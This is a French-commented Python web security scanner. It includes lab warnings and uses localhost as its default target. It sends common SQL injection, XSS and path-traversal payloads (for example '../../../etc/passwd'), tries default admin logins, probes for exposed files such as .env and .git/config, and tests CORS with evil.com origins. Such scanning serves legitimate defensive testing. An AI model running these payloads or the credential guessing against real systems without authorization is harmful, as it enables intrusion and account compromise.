#!/usr/bin/env python3
"""
Lab de test de sécurité pour applications web
IMPORTANT: À utiliser uniquement sur vos propres applications ou avec autorisation explicite
"""

import requests
import time
from urllib.parse import urljoin, quote
import concurrent.futures
import json
import re
from bs4 import BeautifulSoup
import ssl
import warnings

# Désactiver les avertissements SSL pour les tests
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

class WebSecurityTester:
    def __init__(self, base_url, timeout=10):
        """
        Initialise le testeur de sécurité
        
        Args:
            base_url: URL de base de l'application à tester
            timeout: Timeout pour les requêtes HTTP
        """
        self.base_url = base_url.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False  # Pour les certificats auto-signés
        self.results = {
            'vulnerabilities': [],
            'info': [],
            'warnings': []
        }
    
    def test_headers_security(self):
        """Teste les en-têtes de sécurité HTTP"""
        print("\n[*] Test des en-têtes de sécurité...")
        
        try:
            response = self.session.get(self.base_url, timeout=self.timeout)
            headers = response.headers
            
            # En-têtes de sécurité recommandés
            security_headers = {
                'X-Frame-Options': 'Protection contre le clickjacking',
                'X-Content-Type-Options': 'Protection contre le MIME sniffing',
                'X-XSS-Protection': 'Protection XSS (obsolète mais encore utile)',
                'Strict-Transport-Security': 'Force HTTPS',
                'Content-Security-Policy': 'Politique de sécurité du contenu',
                'Referrer-Policy': 'Contrôle des informations de référent'
            }
            
            for header, description in security_headers.items():
                if header not in headers:
                    self.results['warnings'].append(
                        f"En-tête manquant: {header} ({description})"
                    )
                else:
                    self.results['info'].append(
                        f"En-tête présent: {header} = {headers[header]}"
                    )
                    
        except Exception as e:
            self.results['warnings'].append(f"Erreur test en-têtes: {str(e)}")
    
    def test_sql_injection(self, test_params=None):
        """Test basique d'injection SQL"""
        print("\n[*] Test d'injection SQL...")
        
        if test_params is None:
            test_params = ['id', 'user', 'page', 'item', 'product']
        
        sql_payloads = [
            "' OR '1'='1",
            "1' OR '1' = '1",
            "' OR 1=1--",
            "admin'--",
            "1 UNION SELECT NULL--"
        ]
        
        for param in test_params:
            for payload in sql_payloads:
                try:
                    # Test GET
                    url = f"{self.base_url}?{param}={quote(payload)}"
                    response = self.session.get(url, timeout=self.timeout)
                    
                    # Analyse de la réponse
                    if self._check_sql_error(response.text):
                        self.results['vulnerabilities'].append(
                            f"Possible injection SQL (GET): {param} avec payload: {payload}"
                        )
                    
                    # Test POST
                    data = {param: payload}
                    response = self.session.post(self.base_url, data=data, timeout=self.timeout)
                    
                    if self._check_sql_error(response.text):
                        self.results['vulnerabilities'].append(
                            f"Possible injection SQL (POST): {param} avec payload: {payload}"
                        )
                        
                except Exception as e:
                    pass
    
    def _check_sql_error(self, content):
        """Vérifie la présence d'erreurs SQL dans le contenu"""
        sql_errors = [
            'SQL syntax',
            'mysql_fetch',
            'Warning: mysql',
            'MySQLSyntaxErrorException',
            'valid MySQL result',
            'PostgreSQL',
            'ORA-01756',
            'SQLServer',
            'Microsoft SQL Native Client'
        ]
        
        for error in sql_errors:
            if error.lower() in content.lower():
                return True
        return False
    
    def test_xss(self, test_params=None):
        """Test de vulnérabilités XSS"""
        print("\n[*] Test XSS...")
        
        if test_params is None:
            test_params = ['search', 'q', 'query', 'name', 'comment']
        
        xss_payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            'javascript:alert("XSS")',
            '<iframe src="javascript:alert(\'XSS\')"></iframe>'
        ]
        
        for param in test_params:
            for payload in xss_payloads:
                try:
                    # Test reflected XSS
                    url = f"{self.base_url}?{param}={quote(payload)}"
                    response = self.session.get(url, timeout=self.timeout)
                    
                    if payload in response.text:
                        self.results['vulnerabilities'].append(
                            f"Possible XSS réfléchi: {param} avec payload: {payload[:30]}..."
                        )
                        
                except Exception as e:
                    pass
    
    def test_directory_traversal(self):
        """Test de traversée de répertoire"""
        print("\n[*] Test de traversée de répertoire...")
        
        traversal_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\win.ini',
            '....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
        ]
        
        test_params = ['file', 'path', 'page', 'document', 'include']
        
        for param in test_params:
            for payload in traversal_payloads:
                try:
                    url = f"{self.base_url}?{param}={quote(payload)}"
                    response = self.session.get(url, timeout=self.timeout)
                    
                    # Vérifier les indicateurs de succès
                    if any(indicator in response.text for indicator in ['root:', '[fonts]', 'daemon:']):
                        self.results['vulnerabilities'].append(
                            f"Possible traversée de répertoire: {param} avec payload: {payload}"
                        )
                        
                except Exception as e:
                    pass
    
    def test_weak_authentication(self):
        """Test d'authentification faible"""
        print("\n[*] Test d'authentification faible...")
        
        common_credentials = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('root', 'root'),
            ('test', 'test'),
            ('demo', 'demo')
        ]
        
        login_endpoints = ['/login', '/admin', '/user/login', '/wp-login.php']
        
        for endpoint in login_endpoints:
            url = urljoin(self.base_url, endpoint)
            
            try:
                # Vérifier si l'endpoint existe
                response = self.session.get(url, timeout=self.timeout)
                if response.status_code == 200:
                    self.results['info'].append(f"Endpoint de login trouvé: {endpoint}")
                    
                    # Tester les credentials faibles
                    for username, password in common_credentials:
                        data = {
                            'username': username,
                            'password': password,
                            'user': username,
                            'pass': password,
                            'login': username,
                            'pwd': password
                        }
                        
                        response = self.session.post(url, data=data, timeout=self.timeout)
                        
                        # Vérifier les indicateurs de succès
                        if 'dashboard' in response.url or 'admin' in response.url:
                            self.results['vulnerabilities'].append(
                                f"Authentification faible: {username}:{password} sur {endpoint}"
                            )
                            
            except Exception as e:
                pass
    
    def test_sensitive_files(self):
        """Recherche de fichiers sensibles exposés"""
        print("\n[*] Recherche de fichiers sensibles...")
        
        sensitive_files = [
            '.git/config',
            '.env',
            'wp-config.php',
            'config.php',
            '.htaccess',
            'web.config',
            'phpinfo.php',
            'info.php',
            '.DS_Store',
            'robots.txt',
            'sitemap.xml',
            'backup.sql',
            'database.sql',
            '.bak',
            '.old',
            '.swp'
        ]
        
        for file in sensitive_files:
            try:
                url = urljoin(self.base_url, file)
                response = self.session.get(url, timeout=self.timeout)
                
                if response.status_code == 200:
                    self.results['vulnerabilities'].append(
                        f"Fichier sensible accessible: {file}"
                    )
                    
            except Exception as e:
                pass
    
    def test_cors_configuration(self):
        """Test de la configuration CORS"""
        print("\n[*] Test de configuration CORS...")
        
        test_origins = [
            'http://evil.com',
            'null',
            'https://attacker.com'
        ]
        
        for origin in test_origins:
            try:
                headers = {'Origin': origin}
                response = self.session.get(self.base_url, headers=headers, timeout=self.timeout)
                
                if 'Access-Control-Allow-Origin' in response.headers:
                    allowed_origin = response.headers['Access-Control-Allow-Origin']
                    
                    if allowed_origin == '*' or allowed_origin == origin:
                        self.results['vulnerabilities'].append(
                            f"CORS mal configuré: Accepte l'origine {origin}"
                        )
                        
            except Exception as e:
                pass
    
    def run_all_tests(self):
        """Exécute tous les tests de sécurité"""
        print(f"\n[*] Démarrage des tests de sécurité sur {self.base_url}")
        print("[*] ATTENTION: N'utilisez ceci que sur vos propres applications!")
        
        self.test_headers_security()
        self.test_sql_injection()
        self.test_xss()
        self.test_directory_traversal()
        self.test_weak_authentication()
        self.test_sensitive_files()
        self.test_cors_configuration()
        
        return self.results
    
    def generate_report(self):
        """Génère un rapport des résultats"""
        print("\n" + "="*60)
        print("RAPPORT DE SÉCURITÉ")
        print("="*60)
        
        print(f"\nCible: {self.base_url}")
        print(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        
        print(f"\n[!] Vulnérabilités trouvées: {len(self.results['vulnerabilities'])}")
        for vuln in self.results['vulnerabilities']:
            print(f"  - {vuln}")
        
        print(f"\n[*] Avertissements: {len(self.results['warnings'])}")
        for warning in self.results['warnings']:
            print(f"  - {warning}")
        
        print(f"\n[+] Informations: {len(self.results['info'])}")
        for info in self.results['info']:
            print(f"  - {info}")
        
        # Sauvegarder le rapport
        report_filename = f"security_report_{time.strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_filename, 'w') as f:
            json.dump(self.results, f, indent=4)
        
        print(f"\n[*] Rapport sauvegardé dans: {report_filename}")


# Exemple d'utilisation
if __name__ == "__main__":
    # IMPORTANT: Remplacez par l'URL de VOTRE application de test
    target_url = "http://localhost:4200"  # Changez cette URL
    
    print("╔══════════════════════════════════════════╗")
    print("║   Lab de Test de Sécurité Web - Python   ║")
    print("╠══════════════════════════════════════════╣")
    print("║  ⚠️  AVERTISSEMENT LÉGAL:                 ║")
    print("║  Utilisez uniquement sur VOS propres     ║")
    print("║  applications ou avec autorisation!      ║")
    print("╚══════════════════════════════════════════╝")
    
    # Créer le testeur
    tester = WebSecurityTester(target_url)
    
    # Exécuter tous les tests
    results = tester.run_all_tests()
    
    # Générer le rapport
    tester.generate_report()
    
    # Tests additionnels personnalisés
    print("\n[*] Pour des tests plus approfondis, vous pouvez:")
    print("  - Ajouter des endpoints spécifiques à tester")
    print("  - Personnaliser les payloads selon votre application")
    print("  - Intégrer avec des outils comme OWASP ZAP ou Burp Suite")
    print("  - Utiliser des scanners de vulnérabilités comme Nikto")